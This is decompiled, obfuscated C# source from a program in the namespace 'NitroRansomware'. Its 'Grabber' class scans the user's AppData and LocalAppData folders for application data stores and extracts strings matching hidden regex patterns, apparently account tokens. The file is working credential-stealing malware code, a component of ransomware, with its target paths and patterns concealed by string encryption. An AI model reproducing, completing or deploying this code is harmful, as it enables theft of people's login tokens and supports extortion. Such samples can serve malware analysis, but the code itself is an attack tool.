using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace NitroRansomware;

internal class Grabber
{
	private static List<string> target;

	private static void Scan()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		target.Add(folderPath + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3302));
		target.Add(folderPath + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3322));
		target.Add(folderPath + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3354));
		target.Add(folderPath + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3380));
		target.Add(folderPath2 + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3442));
		target.Add(folderPath2 + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3510));
		target.Add(folderPath2 + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3606));
	}

	public static List<string> Grab()
	{
		Scan();
		List<string> list = new List<string>();
		foreach (string item in target)
		{
			if (!Directory.Exists(item))
			{
				continue;
			}
			string path = item + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3688);
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			FileInfo[] files = directoryInfo.GetFiles(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3736));
			foreach (FileInfo fileInfo in files)
			{
				string input = fileInfo.OpenText().ReadToEnd();
				foreach (Match item2 in Regex.Matches(input, WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3750)))
				{
					list.Add(item2.Value);
				}
				foreach (Match item3 in Regex.Matches(input, WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3814)))
				{
					list.Add(item3.Value);
				}
			}
		}
		return list;
	}

	public Grabber()
	{
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		base._002Ector();
	}

	static Grabber()
	{
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		target = new List<string>();
	}
}
